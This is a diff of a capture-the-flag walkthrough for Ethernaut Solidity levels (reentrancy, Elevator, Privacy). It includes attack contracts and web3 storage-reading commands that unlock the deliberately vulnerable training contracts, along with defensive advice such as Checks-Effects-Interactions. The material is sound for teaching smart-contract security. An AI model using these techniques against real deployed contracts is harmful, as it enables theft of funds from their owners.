@@ -222,7 +222,7 @@ contract KingAttack {
 
 This is the same exploit that led to the [DAO hack](https://www.coindesk.com/learn/2016/06/25/understanding-the-dao-attack/). Which caused the Ethereum blockchain to fork into the official Ethereum blockchain and Ethereum Classic.
 
-There is a very important pattern called Checks - Effects - Interactions in Solidity, this is one of the multiple ways to secure a smart contract from a re-entrant attack, other ways include using a [mutex lock] (https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21)
+There is a very important pattern called Checks - Effects - Interactions in Solidity, this is one of the multiple ways to secure a smart contract from a re-entrant attack, other ways include using a [mutex lock]((https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21)
 Using the C-E-I, we basically check if we can do something, such as checking balance, we then apply the effects of doing it on our contract, such as updating balance then we do the actual interactions on-chain with other, such as transferring money.
 In this case where we have the withdrawal function with the interaction coming before the effect. This means that when we receive money from within the withdraw, things are briefly in our control until the program goes back to the withdraw function to do the effect. While we have control we can keep on calling withdraw in a loop until everything is drained and there is nothing left.
 
@@ -288,11 +288,17 @@ Always update state variables before calling functions on external contracts. An
 
 ## 11. Elevator
 
-This level is pretty tricky, but main thing here is that we should always be conscious of the visibility specifiers and state modifiers we choose to use in our function signatures. Since we don't always want certain functions to modify the state, we need to make sure that we select the right specifiers/modifiers.
+Here we are looking at interfaces, i.e how to use a contract without having to copy paste all it's code
+
+This level is pretty tricky, but main thing here is that we should always be conscious of the visibility specifiers and state modifiers we choose to use in our function signatures. Since we don't always want certain functions to modify the state, we need to make sure that we select the right specifiers/modifiers, cause external at the `islastfloor` function allows us to change the state, so an alternative would have been to use view instead as that way we can read state but not modify it and this can save us from some attacks.
 So to pass this level we can head on to remix, pass on the elevator contract and also create our elevatorAttack contract, then we call the setTop function.
 
+Here is a short explanation to the elevatorAttack contract, we use toggle to toggle our topFloor, we initiate the elevator contract and set it to be the targetAddress, state variable is automatically set to true, which we're going to name  as toggle. We then put in the target address in the constructor and instantiate that with the elevator contract and then put it into the target variable.
+The `isLastFloor` function just returns if the number we pass to it is the floor or not, but under this we change our toggle from true to false and then return it as false so as to pass the condition set by the level since it has to be false for us to continue, funny but note that the uint that’s being taken into this function doesn’t really matter, as we are just toggling the boolean state with this function.
+ Now for the second function `setTop` it takes a uint and then calls the `goTo` function on the target and execute, and that’s it! Below is the code.
+
 ```
-pragma solidity ^0.6.0;
+pragma solidity 0.8.0;
 
 
 interface Building {
@@ -345,36 +351,53 @@ This is similar to the 8th level Vault, where we read the EVM storage. Here in a
 
 EVM stores state variables in chunks of 32 bytes. If consecutive variables make up a 32-byte space (such as in this case 8 + 8 + 16 = 32) they are stored in the same chunk. If we were to write them elsewhere, this optimization may not have happened. 
 
-Using this to check for the results for the values of i.
+Using this we can check for each data stored at their respective slots, where ` i ` is the slot position.
 
 ```
-let storage = []
 
-let callbackFNConstructor = (index) => (error, contractData) => {
-  storage[index] = contractData
-}
+  web3.eth.getStorageAt(contract.address, i, console.log)
 
-for(var i = 0; i < 6; i++) {
-  web3.eth.getStorageAt(contract.address, i, callbackFNConstructor(i))
-}
 
 ```
 0: 0x0000000000000000000000000000000000000000000000000000000000000001 This is the bool public locked = true which is stored as 1.
-1: 0x0000000000000000000000000000000000000000000000000000000062bc6f36 This is the uint256 public ID = block.timestamp which is the UNIX timestamp in hex, 62bc6f36 (of this block in my instance])
-2: 0x000000000000000000000000000000000000000000000000000000006f36ff0a This is the 32 byte chunk of 3 variables all captures in 6f36ff0a:
+1: 0x0000000000000000000000000000000000000000000000000000000063b3ed94 This is the uint256 public ID = block.timestamp which is the UNIX timestamp in hex, 63b3ed94  (of this block in my instance])
+2: 0x00000000000000000000000000000000000000000000000000000000ed94ff0a This is the 32 byte chunk of 3 variables all captures in ed94ff0a:
 uint8 private flattening = 10 which is 0a
 uint8 private denomination = 255 which is ff
-uint16 private awkwardness = uint16(now) which is 6f36. Well, that awkwardness variable is just the block.timestamp casted to 16-bits. We already know the actual 256-bit (32-byte) value of timestamp above: 62bc6f36. When casted down 16-bits, it became 6f36 (4 x 4-bit hexadecimals).
-3: 0x0ec18718027136372f96fb04400e05bac5ba7feda24823118503bff40bc5eb55 This is data[0].
-4: 0x61a99635e6d4b7233a35f3d0d5d8fadf2981d424110e8bca127d64958d1e68c0 This is data[1].
-5: 0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf This is data[2].
+uint16 private awkwardness = uint16(now) which is ed94. Well, that awkwardness variable is just the block.timestamp casted to 16-bits. We already know the actual 256-bit (32-byte) value of timestamp above: 63b3ed94. When casted down 16-bits, it became ed94 (4 x 4-bit hexadecimals).
+3: 0x84221c8dbda8c1eaa07c361597d02f125e1c14f80c68be67430b916bf28b6955 This is data[0].
+4: 0x47bcb629da52fce854213615f7cc9ab9a93bb3e25f635850291221fbd5101a8b This is data[1].
+5: 0x0bc2b4c5a5e81ccd11ef655edeae12c652e74a0290dff9b898301215dfc4d1d5 This is data[2].
 Now we just need data[2] casted down to bytes16. Here is how casting works in very few words:
 
 Conversion to smaller type costs more signficant bits. (e.g. uint32 -> uint16)
 Conversion to higher type adds padding bits to the left. (e.g. uint16 -> uint32)
 Conversion to smaller byte costs less significant bits. (e.g. bytes32 -> bytes16)
 Conversion to larger byte add padding bits to the right. (e.g. bytes16 -> bytes32)
-So, when we cast down data[2] we will get the left-half of it: '0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf'.slice(0, 2 + 32) and then await contract.unlock('0x46b7d5d54e84dc3ac47f57bea2ca5f79'). That is all! 
+So, when we cast down data[2] we will get the left-half of it: '0x0bc2b4c5a5e81ccd11ef655edeae12c652e74a0290dff9b898301215dfc4d1d5'.slice(0, 2 + 32) and then await contract.unlock('0x0bc2b4c5a5e81ccd11ef655edeae12c6'). That is all! 
+
+Alternatively, If you'd like to use remix we can create our attack contract and then pass in the data[2] as bytes 32 to be converted to bytes 16 and then unlock the level via a contract and not our EOA
+
+```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.0; 
+
+import './Privacy.sol';
+
+contract PrivacyAttack {
+    Privacy target;
+    
+    constructor(address _targetAddr) public {
+        target = Privacy(_targetAddr);
+    }
+
+    function unlock(bytes32 _storedValue) public {
+        bytes16 key = bytes16(_storedValue);
+        target.unlock(key);
+    }
+}
+
+```
 
 
 
